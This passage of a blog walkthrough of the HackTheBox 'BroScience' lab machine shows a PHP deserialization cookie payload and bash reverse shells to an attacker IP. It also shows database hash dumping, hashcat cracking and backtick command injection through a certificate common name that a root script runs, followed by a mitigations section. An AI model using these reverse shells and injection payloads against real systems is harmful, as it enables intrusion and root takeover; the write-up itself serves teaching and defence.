<span class="sb">`bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.5/4444 0&gt;&amp;1'`</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div>
<p>I generated the cookie value and used it to set the <code class="language-plaintext highlighter-rouge">user-prefs</code> cookie in my browser.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>php createCookie.php
TzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7czoyMToiaHR0cDovLzEwLjEwLjE0LjIvcmNlIjtzOjc6ImltZ1BhdGgiO3M6MjI6Ii92YXIvd3d3L2h0bWwvdGVzdC5waHAiO30%3D
</pre></td></tr></tbody></table></code></div></div>

<p>I opened the home page of the site and saw that it requested the <code class="language-plaintext highlighter-rouge">rce</code> file from my web server.</p>

<p>Finally, I launched a netcat listener and navigated to <code class="language-plaintext highlighter-rouge">https://broscience.htb/test.php</code>.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-klvnp</span> 4444
listening on <span class="o">[</span>any] 4444 ...
connect to <span class="o">[</span>10.10.14.5] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.195] 41862
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>834<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell

www-data@broscience:/var/www/html<span class="nv">$ </span><span class="nb">ls
ls
</span>activate.php
comment.php
exercise.php
images
includes
index.php
login.php
logout.php
register.php
styles
swap_theme.php
test2.php
update_user.php
user.php
</pre></td></tr></tbody></table></code></div></div>

<h2 id="getting-a-user"><span class="mr-2">Getting A User</span><a href="#getting-a-user" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>I was on the server, but as <code class="language-plaintext highlighter-rouge">www-data</code> which can’t do much. I had some database credentials so I use them to see what the db contained.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>www-data@broscience:/var/www/html<span class="nv">$ </span>psql <span class="nt">-U</span> dbuser <span class="nt">-W</span> broscience <span class="nt">-p5432</span> <span class="nt">-hlocalhost</span>
Password:
psql <span class="o">(</span>13.9 <span class="o">(</span>Debian 13.9-0+deb11u1<span class="o">))</span>
SSL connection <span class="o">(</span>protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off<span class="o">)</span>
Type <span class="s2">"help"</span> <span class="k">for </span>help.

<span class="nv">broscience</span><span class="o">=&gt;</span> Select username, password From <span class="nb">users</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The <code class="language-plaintext highlighter-rouge">users</code> table contained usernames and hashed passwords.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>   username    |             password
---------------+----------------------------------
 administrator | 15657792073e8a843d4f91fc403454e1
 bill          | 13edad4932da9dbb57d9cd15b66ed104
 michael       | bd3dad50e2d578ecba87d5fa15ca5f85
 john          | a7eed23a7be6fe0d765197b1027453fe
 dmytro        | 5d15340bded5b9395d5d14b9c21bc82b
</pre></td></tr></tbody></table></code></div></div>

<p>I remembered from reading the <code class="language-plaintext highlighter-rouge">db_connect.php</code> file that the passwords were ‘salted’ with ‘NaCl’. And from the register code that the salt was put before the password, then hashed with <code class="language-plaintext highlighter-rouge">md5</code>.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nb">md5</span><span class="p">(</span><span class="nv">$db_salt</span> <span class="mf">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">])</span>
</pre></td></tr></tbody></table></code></div></div>
<p>I saved the hashes in a file and used hashcat to crack them.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat </span>hashes.txt   
administrator:15657792073e8a843d4f91fc403454e1:NaCl
bill:13edad4932da9dbb57d9cd15b66ed104:NaCl
michael:bd3dad50e2d578ecba87d5fa15ca5f85:NaCl
john:a7eed23a7be6fe0d765197b1027453fe:NaCl
dmytro:5d15340bded5b9395d5d14b9c21bc82b:NaCl

<span class="nv">$ </span>hashcat <span class="nt">-a0</span> <span class="nt">-m20</span> hashes.txt /usr/share/seclists/rockyou.txt <span class="nt">--username</span>
hashcat <span class="o">(</span>v6.2.6<span class="o">)</span> starting

OpenCL API <span class="o">(</span>OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG<span class="o">)</span> - Platform <span class="c">#1 [The pocl project]</span>
<span class="o">==================================================================================================================================================</span>
<span class="k">*</span> Device <span class="c">#1: pthread-sandybridge-AMD Ryzen 7 PRO 5850U with Radeon Graphics, 2869/5803 MB (1024 MB allocatable), 6MCU</span>

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimim salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 5 digests<span class="p">;</span> 5 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
<span class="k">*</span> Zero-Byte
<span class="k">*</span> Early-Skip
<span class="k">*</span> Not-Iterated
<span class="k">*</span> Single-Salt
<span class="k">*</span> Raw-Hash

ATTENTION! Pure <span class="o">(</span>unoptimized<span class="o">)</span> backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append <span class="nt">-O</span> to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger <span class="nb">set </span>to 90c

Host memory required <span class="k">for </span>this attack: 1 MB

Dictionary cache hit:
<span class="k">*</span> Filename..: /usr/share/seclists/rockyou.txt
<span class="k">*</span> Passwords.: 14344384
<span class="k">*</span> Bytes.....: 139921497
<span class="k">*</span> Keyspace..: 14344384


13edad4932da9dbb57d9cd15b66ed104:NaCl:REDACTED
5d15340bded5b9395d5d14b9c21bc82b:NaCl:REDACTED
bd3dad50e2d578ecba87d5fa15ca5f85:NaCl:REDACTED
Approaching final keyspace - workload adjusted.


Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 20 <span class="o">(</span>md5<span class="o">(</span><span class="nv">$salt</span>.<span class="nv">$pass</span><span class="o">))</span>
Hash.Target......: hashes.txt
Time.Started.....: Sun Jan 29 17:53:33 2023 <span class="o">(</span>3 secs<span class="o">)</span>
Time.Estimated...: Sun Jan 29 17:53:36 2023 <span class="o">(</span>0 secs<span class="o">)</span>
Kernel.Feature...: Pure Kernel
Guess.Base.......: File <span class="o">(</span>/usr/share/seclists/rockyou.txt<span class="o">)</span>
Guess.Queue......: 1/1 <span class="o">(</span>100.00%<span class="o">)</span>
Speed.#1.........:  5515.0 kH/s <span class="o">(</span>0.14ms<span class="o">)</span> @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 3/5 <span class="o">(</span>60.00%<span class="o">)</span> Digests <span class="o">(</span>total<span class="o">)</span>, 3/5 <span class="o">(</span>60.00%<span class="o">)</span> Digests <span class="o">(</span>new<span class="o">)</span>
Progress.........: 14344384/14344384 <span class="o">(</span>100.00%<span class="o">)</span>
Rejected.........: 0/14344384 <span class="o">(</span>0.00%<span class="o">)</span>
Restore.Point....: 14344384/14344384 <span class="o">(</span>100.00%<span class="o">)</span>
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: <span class="nv">$HEX</span><span class="o">[</span>21217365786d652121] -&gt; <span class="nv">$HEX</span><span class="o">[</span>042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util: 32%

Started: Sun Jan 29 17:53:11 2023
Stopped: Sun Jan 29 17:53:37 2023

<span class="nv">$ </span>hashcat <span class="nt">-a0</span> <span class="nt">-m20</span> hashes.txt /usr/share/seclists/rockyou.txt <span class="nt">--username</span> <span class="nt">--show</span>
bill:13edad4932da9dbb57d9cd15b66ed104:NaCl:REDACTED
michael:bd3dad50e2d578ecba87d5fa15ca5f85:NaCl:REDACTED
dmytro:5d15340bded5b9395d5d14b9c21bc82b:NaCl:REDACTED
</pre></td></tr></tbody></table></code></div></div>

<p>I used bill’s password to connect to the server and get the user flag.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>ssh bill@target
bill@target<span class="s1">'s password:
Linux broscience 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Jan  2 04:45:21 2023 from 10.10.14.40

bill@broscience:~$ cat user.txt
REDACTED
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="certificate-renewal"><span class="mr-2">Certificate Renewal</span><a href="#certificate-renewal" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>I looked around the server. I found a script in <code class="language-plaintext highlighter-rouge">/opt/renew_cert.sh</code>. The script was looking for a certificate, and if it was expiring soon, it would read some information about it, generate a new one, and move it in bill’s home folder.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
</pre></td><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

<span class="k">if</span> <span class="o">[</span> <span class="s2">"$#"</span> <span class="nt">-ne</span> 1 <span class="o">]</span> <span class="o">||</span> <span class="o">[</span> <span class="nv">$1</span> <span class="o">==</span> <span class="s2">"-h"</span> <span class="o">]</span> <span class="o">||</span> <span class="o">[</span> <span class="nv">$1</span> <span class="o">==</span> <span class="s2">"--help"</span> <span class="o">]</span> <span class="o">||</span> <span class="o">[</span> <span class="nv">$1</span> <span class="o">==</span> <span class="s2">"help"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
    </span><span class="nb">echo</span> <span class="s2">"Usage: </span><span class="nv">$0</span><span class="s2"> certificate.crt"</span><span class="p">;</span>
    <span class="nb">exit </span>0<span class="p">;</span>
<span class="k">fi

if</span> <span class="o">[</span> <span class="nt">-f</span> <span class="nv">$1</span> <span class="o">]</span><span class="p">;</span> <span class="k">then

    </span>openssl x509 <span class="nt">-in</span> <span class="nv">$1</span> <span class="nt">-noout</span> <span class="nt">-checkend</span> 86400 <span class="o">&gt;</span> /dev/null

    <span class="k">if</span> <span class="o">[</span> <span class="nv">$?</span> <span class="nt">-eq</span> 0 <span class="o">]</span><span class="p">;</span> <span class="k">then
        </span><span class="nb">echo</span> <span class="s2">"No need to renew yet."</span><span class="p">;</span>
        <span class="nb">exit </span>1<span class="p">;</span>
    <span class="k">fi

    </span><span class="nv">subject</span><span class="o">=</span><span class="si">$(</span>openssl x509 <span class="nt">-in</span> <span class="nv">$1</span> <span class="nt">-noout</span> <span class="nt">-subject</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s2">"="</span> <span class="nt">-f2-</span><span class="si">)</span>

    <span class="nv">country</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$subject</span> | <span class="nb">grep</span> <span class="nt">-Eo</span> <span class="s1">'C = .{2}'</span><span class="si">)</span>
    <span class="nv">state</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$subject</span> | <span class="nb">grep</span> <span class="nt">-Eo</span> <span class="s1">'ST = .*,'</span><span class="si">)</span>
    <span class="nv">locality</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$subject</span> | <span class="nb">grep</span> <span class="nt">-Eo</span> <span class="s1">'L = .*,'</span><span class="si">)</span>
    <span class="nv">organization</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$subject</span> | <span class="nb">grep</span> <span class="nt">-Eo</span> <span class="s1">'O = .*,'</span><span class="si">)</span>
    <span class="nv">organizationUnit</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$subject</span> | <span class="nb">grep</span> <span class="nt">-Eo</span> <span class="s1">'OU = .*,'</span><span class="si">)</span>
    <span class="nv">commonName</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$subject</span> | <span class="nb">grep</span> <span class="nt">-Eo</span> <span class="s1">'CN = .*,?'</span><span class="si">)</span>
    <span class="nv">emailAddress</span><span class="o">=</span><span class="si">$(</span>openssl x509 <span class="nt">-in</span> <span class="nv">$1</span> <span class="nt">-noout</span> <span class="nt">-email</span><span class="si">)</span>

    <span class="nv">country</span><span class="o">=</span><span class="k">${</span><span class="nv">country</span>:4<span class="k">}</span>
    <span class="nv">state</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="k">${</span><span class="nv">state</span>:5<span class="k">}</span> | <span class="nb">awk</span> <span class="nt">-F</span>, <span class="s1">'{print $1}'</span><span class="si">)</span>
    <span class="nv">locality</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="k">${</span><span class="nv">locality</span>:3<span class="k">}</span> | <span class="nb">awk</span> <span class="nt">-F</span>, <span class="s1">'{print $1}'</span><span class="si">)</span>
    <span class="nv">organization</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="k">${</span><span class="nv">organization</span>:4<span class="k">}</span> | <span class="nb">awk</span> <span class="nt">-F</span>, <span class="s1">'{print $1}'</span><span class="si">)</span>
    <span class="nv">organizationUnit</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="k">${</span><span class="nv">organizationUnit</span>:5<span class="k">}</span> | <span class="nb">awk</span> <span class="nt">-F</span>, <span class="s1">'{print $1}'</span><span class="si">)</span>
    <span class="nv">commonName</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="k">${</span><span class="nv">commonName</span>:5<span class="k">}</span> | <span class="nb">awk</span> <span class="nt">-F</span>, <span class="s1">'{print $1}'</span><span class="si">)</span>

    <span class="nb">echo</span> <span class="nv">$subject</span><span class="p">;</span>
    <span class="nb">echo</span> <span class="s2">""</span><span class="p">;</span>
    <span class="nb">echo</span> <span class="s2">"Country     =&gt; </span><span class="nv">$country</span><span class="s2">"</span><span class="p">;</span>
    <span class="nb">echo</span> <span class="s2">"State       =&gt; </span><span class="nv">$state</span><span class="s2">"</span><span class="p">;</span>
    <span class="nb">echo</span> <span class="s2">"Locality    =&gt; </span><span class="nv">$locality</span><span class="s2">"</span><span class="p">;</span>
    <span class="nb">echo</span> <span class="s2">"Org Name    =&gt; </span><span class="nv">$organization</span><span class="s2">"</span><span class="p">;</span>
    <span class="nb">echo</span> <span class="s2">"Org Unit    =&gt; </span><span class="nv">$organizationUnit</span><span class="s2">"</span><span class="p">;</span>
    <span class="nb">echo</span> <span class="s2">"Common Name =&gt; </span><span class="nv">$commonName</span><span class="s2">"</span><span class="p">;</span>
    <span class="nb">echo</span> <span class="s2">"Email       =&gt; </span><span class="nv">$emailAddress</span><span class="s2">"</span><span class="p">;</span>

    <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">Generating certificate..."</span><span class="p">;</span>
    openssl req <span class="nt">-x509</span> <span class="nt">-sha256</span> <span class="nt">-nodes</span> <span class="nt">-newkey</span> rsa:4096 <span class="nt">-keyout</span> /tmp/temp.key <span class="nt">-out</span> /tmp/temp.crt <span class="nt">-days</span> 365 <span class="o">&lt;&lt;&lt;</span><span class="s2">"</span><span class="nv">$country</span><span class="s2">
    </span><span class="nv">$state</span><span class="s2">
    </span><span class="nv">$locality</span><span class="s2">
    </span><span class="nv">$organization</span><span class="s2">
    </span><span class="nv">$organizationUnit</span><span class="s2">
    </span><span class="nv">$commonName</span><span class="s2">
    </span><span class="nv">$emailAddress</span><span class="s2">
    "</span> 2&gt;/dev/null

    /bin/bash <span class="nt">-c</span> <span class="s2">"mv /tmp/temp.crt /home/bill/Certs/</span><span class="nv">$commonName</span><span class="s2">.crt"</span>
<span class="k">else
    </span><span class="nb">echo</span> <span class="s2">"File doesn't exist"</span>
    <span class="nb">exit </span>1<span class="p">;</span>
<span class="k">fi</span>
</pre></td></tr></tbody></table></code></div></div>

<p>I thought I might be able to use some of the information it read from the original certificated to get code execution. But I had to find out how the script ran. I uploaded <code class="language-plaintext highlighter-rouge">pspy</code> to the server and ran it.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>2023/01/29 18:30:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>1462   | /bin/bash /root/cron.sh
2023/01/29 18:30:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>1463   | <span class="nb">timeout </span>10 /bin/bash <span class="nt">-c</span> /opt/renew_cert.sh /home/bill/Certs/broscience.crt
</pre></td></tr></tbody></table></code></div></div>

<p>The script was running as root, and reading the certificate in <code class="language-plaintext highlighter-rouge">/home/bill/Certs/broscience.crt</code>.</p>

<p>I used the command in the script to generate certificates that expired in one day. I played with the different values it read from the certificate before generating a new one and found that I could get code execution in the common name when the file was moved.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre></td><td class="rouge-code"><pre>bill@broscience:/tmp/tmp.ML5bZVF2Ow<span class="nv">$ </span>openssl req <span class="nt">-x509</span> <span class="nt">-sha256</span> <span class="nt">-nodes</span> <span class="nt">-newkey</span> rsa:4096 <span class="nt">-keyout</span> temp.key <span class="nt">-out</span> temp.crt <span class="nt">-days</span> 1 <span class="o">&lt;&lt;&lt;</span><span class="s2">"CA
QC
MTL
someOrg
Unit
MyName</span><span class="se">\`</span><span class="s2">id</span><span class="se">\`</span><span class="s2">
test@test.com
"</span>
Generating a RSA private key
.++++
................................................................................++++
writing new private key to <span class="s1">'temp.key'</span>
<span class="nt">-----</span>
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter <span class="s1">'.'</span>, the field will be left blank.
<span class="nt">-----</span>
Country Name <span class="o">(</span>2 letter code<span class="o">)</span> <span class="o">[</span>AU]:State or Province Name <span class="o">(</span>full name<span class="o">)</span> <span class="o">[</span>Some-State]:Locality Name <span class="o">(</span>eg, city<span class="o">)</span> <span class="o">[]</span>:Organization Name <span class="o">(</span>eg, company<span class="o">)</span> <span class="o">[</span>Internet Widgits Pty Ltd]:Organizational Unit Name <span class="o">(</span>eg, section<span class="o">)</span> <span class="o">[]</span>:Common Name <span class="o">(</span>e.g. server FQDN or YOUR name<span class="o">)</span> <span class="o">[]</span>:Email Address <span class="o">[]</span>:bill@x509 <span class="nt">-noout</span> <span class="nt">-text</span> <span class="nt">-in</span> temp.crt | lessut temp.key <span class="nt">-out</span> temp.crt <span class="nt">-days</span> 1 <span class="o">&lt;&lt;&lt;</span><span class="s2">"CA

bill@broscience:/tmp/tmp.ML5bZVF2Ow</span><span class="nv">$ </span><span class="s2">cp temp.crt /home/bill/Certs/broscience.crt

bill@broscience:/tmp/tmp.ML5bZVF2Ow</span><span class="nv">$ </span><span class="s2">/opt/renew_cert.sh /home/bill/Certs/broscience.crt
C = CA, ST = QC, L = MTL, O = someOrg, OU = Unit, CN = MyName</span><span class="sb">`</span><span class="nb">id</span><span class="sb">`</span><span class="s2">, emailAddress = "</span><span class="nb">test</span>@test.com <span class="s2">"

Country     =&gt; CA
State       =&gt; QC
Locality    =&gt; MTL
Org Name    =&gt; someOrg
Org Unit    =&gt; Unit
Common Name =&gt; MyName</span><span class="sb">`</span><span class="nb">id</span><span class="sb">`</span><span class="s2">
Email       =&gt; test@test.com

Generating certificate...
mv: target 'groups=1000(bill).crt' is not a directory
</span></pre></td></tr></tbody></table></code></div></div>

<p>The command failed, but I could see that my code was executed.</p>

<p>I created a script to launch a reverse shell.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>bill@broscience:/tmp/tmp.ML5bZVF2Ow<span class="nv">$ </span><span class="nb">cat</span> /tmp/tmp.ML5bZVF2Ow/rce.sh
<span class="c">#!/bin/bash</span>

bash <span class="nt">-c</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/10.10.14.2/4444 0&gt;&amp;1'</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Then I created a certificate that would trigger the execution of the script on renewal.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre>bill@broscience:/tmp/tmp.ML5bZVF2Ow<span class="nv">$ </span>openssl req <span class="nt">-x509</span> <span class="nt">-sha256</span> <span class="nt">-nodes</span> <span class="nt">-newkey</span> rsa:4096 <span class="nt">-keyout</span> temp.key <span class="nt">-out</span> temp.crt <span class="nt">-days</span> 1 <span class="o">&lt;&lt;&lt;</span><span class="s2">"CA
QC
MTL
someOrg
Unit
MyName</span><span class="se">\`</span><span class="s2">/tmp/tmp.ML5bZVF2Ow/rce.sh</span><span class="se">\`</span><span class="s2">
test@test.com
"</span>

bill@broscience:/tmp/tmp.ML5bZVF2Ow<span class="nv">$ </span><span class="nb">cp </span>temp.crt /home/bill/Certs/broscience.crt
</pre></td></tr></tbody></table></code></div></div>

<p>I copied the script, launched a netcat listener, and waited for root to renew the certificate.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-klvnp</span> 4444
listening on <span class="o">[</span>any] 4444 ...
connect to <span class="o">[</span>10.10.14.2] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.195] 54574
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>2910<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell

root@broscience:~# <span class="nb">cat</span> /root/root.txt
<span class="nb">cat</span> /root/root.txt
REDACTED
</pre></td></tr></tbody></table></code></div></div>

<h2 id="mitigations"><span class="mr-2">Mitigations</span><a href="#mitigations" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>To secure this application, the first step is to remove the <code class="language-plaintext highlighter-rouge">img.php</code> file. This file is there only to serve images that are already in the webroot. A direct link would work for that.</p>

<p>The code that generates the activation code is vulnerable because it uses the time to seed the random number generation. The documentation to <a href="https://www.php.net/srand">srand</a> says that it’s not necessary to seed it, it’s already done automatically. By seeding it with the time, it makes it easy to predict.</p>

<p>The biggest issue with the site was the unserialization of the cookie. Serialization allows executing code on serialization and unserialization. It should never be used on user data. The cookie was storing a single string for the theme. So it would be sufficient to just store the theme in the cookie. And then validate it against an allowed list of themes.</p>

<p>Once on the server, getting the user was pretty easy. The passwords were stored in the database after being hashed with a very weak hashing algorithm. md5 should not be used anymore. They tried to use a salt, but the salt was the same for every user. Hashcat was able to go through all the passwords in rockyou in 26 seconds, in a small virtual machine. And then, the password found was reused in SSH.</p>

<p>The last issue on the machine was the script that renew the certificate. This was running as root, using data provided by the user. It would have been safer to only act on files that were owned by root and that could not be modified by anyone else. And the arguments should have been escaped. According to this <a href="https://superuser.com/questions/163515/bash-how-to-pass-command-line-arguments-containing-special-characters#349036">StackExchange response</a>, using single quotes around the argument would be sufficient.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">id</span><span class="si">)</span><span class="s2">"</span>
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>kali<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>kali<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>kali<span class="o">)</span>

<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'$(id)'</span>
<span class="si">$(</span><span class="nb">id</span><span class="si">)</span>
</pre></td></tr></tbody></table></code></div></div>

</div>

<div class="post-tail-wrapper text-muted">

  <!-- categories -->
  

  <!-- tags -->
  
  <div class="post-tags">
    <i class="fa fa-tags fa-fw mr-1"></i>
      
      <a href="/tags/walkthrough/"
          class="post-tag no-text-decoration" >Walkthrough</a>
      
      <a href="/tags/hacking/"
          class="post-tag no-text-decoration" >Hacking</a>
      
      <a href="/tags/hackthebox/"
          class="post-tag no-text-decoration" >HackTheBox</a>
      
      <a href="/tags/medium/"
          class="post-tag no-text-decoration" >Medium</a>
      
      <a href="/tags/machine/"
          class="post-tag no-text-decoration" >Machine</a>
      
  </div>
  

  <div class="post-tail-bottom
    d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
    <div class="license-wrapper">

      

        

        This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.

      
    </div>

    <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    
    

    
      
